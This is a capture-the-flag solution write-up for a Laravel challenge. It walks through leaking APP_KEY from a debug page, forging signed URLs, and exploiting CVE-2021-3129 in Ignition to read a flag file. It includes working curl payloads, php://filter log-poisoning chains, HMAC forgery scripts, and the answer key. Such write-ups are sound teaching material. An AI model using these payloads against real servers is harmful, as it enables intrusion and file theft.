# CTF Challenge Solution: Shadow Protocol

---

## Challenge Summary

This challenge chains multiple vulnerabilities:
1. **APP_KEY leak** via Laravel debug error message → enables signature forgery
2. **CVE-2021-3129** (Laravel Ignition RCE) → file system access
3. **Signed URL exploitation** → bypass endpoint protection

The `/_ignition/execute-solution` endpoint is protected by signed URL middleware. Players must:
- Trigger debug error to leak APP_KEY
- Forge a valid signature using the leaked APP_KEY  
- Exploit CVE-2021-3129 to read `/flag.txt`

---

## Step-by-Step Solution

### Step 1: Reconnaissance

Players must explore the application to find vulnerabilities among many decoy endpoints:
- 50+ API endpoints (/api/system/*, /api/network/*, /api/crypto/*, /api/auth/*, etc.)
- 10+ web pages (Dashboard, Network, Modules, Tasks, Diagnostics, Reports, Settings, etc.)
- Most endpoints return 401/403 errors (authentication required)

The challenge is finding the vulnerable path among all the noise.

### Step 2: Discover Debug Leak

The `/api/node/status` endpoint leaks APP_KEY when a malformed request is made.

```bash
curl "http://localhost:5050/api/node/status?node_id=kj"
```

**No special headers required!** Just send an invalid `node_id` parameter.

This triggers a `hex2bin()` error. In the debug HTML response, find:
```
APP_KEY=base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE=
```

> **Reference**: See [debug_response.html](debug_response.html) for a full example of the debug page response showing the leaked APP_KEY in the error context.

### Step 3: Discover the Protected Ignition Endpoint

Players should discover that `/_ignition/execute-solution` exists (standard Laravel debug endpoint).

```bash
curl -X POST http://localhost:5050/_ignition/execute-solution
```

Returns: `403 Invalid signature` - **This is unusual!** Normally this endpoint is unprotected.

### Step 4: Research CVE-2021-3129

Players should search GitHub for CVE-2021-3129 exploits:
- https://github.com/zhzyker/CVE-2021-3129
- https://github.com/ambionics/laravel-exploits
- https://github.com/nth347/CVE-2021-3129_exploit

Key insight: CVE-2021-3129 allows arbitrary file access via the `viewFile` parameter in Ignition solutions.

### Step 5: Forge Signed URL for Ignition

Using the leaked APP_KEY, forge a signed URL:

**Python:**
```python
import hmac
import hashlib
import time

app_key = "base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
base_url = "http://localhost:5050/_ignition/execute-solution"
expires = int(time.time()) + 300

url_with_expires = f"{base_url}?expires={expires}"
signature = hmac.new(
    app_key.encode('utf-8'),
    url_with_expires.encode('utf-8'),
    hashlib.sha256
).hexdigest()

signed_url = f"{url_with_expires}&signature={signature}"
print(signed_url)
```

**Bash:**
```bash
APP_KEY="base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
EXPIRES=$(($(date +%s) + 300))
URL="http://localhost:5050/_ignition/execute-solution?expires=${EXPIRES}"
SIG=$(echo -n "${URL}" | openssl dgst -sha256 -hmac "${APP_KEY}" | awk '{print $NF}')
echo "${URL}&signature=${SIG}"
```

### Step 6: Exploit CVE-2021-3129 to Read /flag.txt

**Method 1: Custom ReadFileSolution (easiest)**
```bash
curl -X POST "${SIGNED_URL}" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "App\\Solutions\\ReadFileSolution",
    "parameters": {
      "variableName": "flag",
      "filePath": "/flag.txt"
    }
  }'
```

Response:
```json
{
  "success": true,
  "file": "/flag.txt",
  "content": "BUETCTF{ignition_signature_chain_pwned}",
  "base64": "QlVFVENURntpZ25pdGlvbl9zaWduYXR1cmVfY2hhaW5fcHduZWR9Cg=="
}
```

**Method 2: Log Poisoning (alternative)**

Uses standard `MakeViewVariableOptionalSolution` with PHP filters to poison Laravel logs:

```bash
# Clear logs
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}'

# Poison logs with base64-encoded flag content
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "php://filter/read=convert.base64-encode/resource=/flag.txt"
  }
}'

# Read the poisoned logs  
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "../storage/logs/laravel.log"
  }
}'
```

Then decode the base64 content to get the flag.

---

## Why This Works

1. **APP_DEBUG=true** - Exposes APP_KEY in error messages
2. **Signed middleware on Ignition** - Requires key forgery (unusual protection)
3. **Vulnerable facade/ignition 2.5.1** - CVE-2021-3129 allows file system access
4. **Custom ReadFileSolution** - Directly returns file content in JSON

---

## Key Learning Points

1. **Vulnerability chaining** - Multiple vulns combined for complete exploit
2. **Real CVE exploitation** - Using actual vulnerable library version
3. **Laravel internals** - Signed URLs, Ignition, APP_KEY cryptography
4. **Tool adaptation** - Modifying existing exploits for new scenarios
5. **Information overload** - Finding signal in noise (50+ endpoints)

---

## Common Mistakes Players Make

1. **Getting lost in decoys** - 50+ API endpoints, most are red herrings
2. **Overthinking the leak** - No special headers needed, just any error
3. **Not finding Ignition** - Must discover `/_ignition/execute-solution` independently
4. **Wrong signature format** - Must use raw APP_KEY string (with `base64:` prefix)
5. **Not trying custom solutions** - The `ReadFileSolution` class is the easiest path
6. **Not modifying exploits** - Public CVE-2021-3129 scripts need signature addition

---

## Tools That May Help Players

- https://github.com/zhzyker/CVE-2021-3129
- https://github.com/ambionics/laravel-exploits  
- CyberChef for HMAC generation
- Burp Suite for request manipulation
- Python/bash for automation

---

## Debug Artifacts

This solution directory includes actual HTTP response samples:

- **debug_response.html** - Full Laravel Ignition debug page showing how the APP_KEY is leaked in error context when triggering the `hex2bin()` validation error. Shows the exact format players should look for.

- **exploit_response.txt** - An error response when attempting to use the standard `MakeViewVariableOptionalSolution` to directly write to `/flag.txt`. This demonstrates why the custom `ReadFileSolution` class or log poisoning methods are necessary (direct file writing fails due to permissions).

These artifacts help players understand what to expect during exploitation attempts.
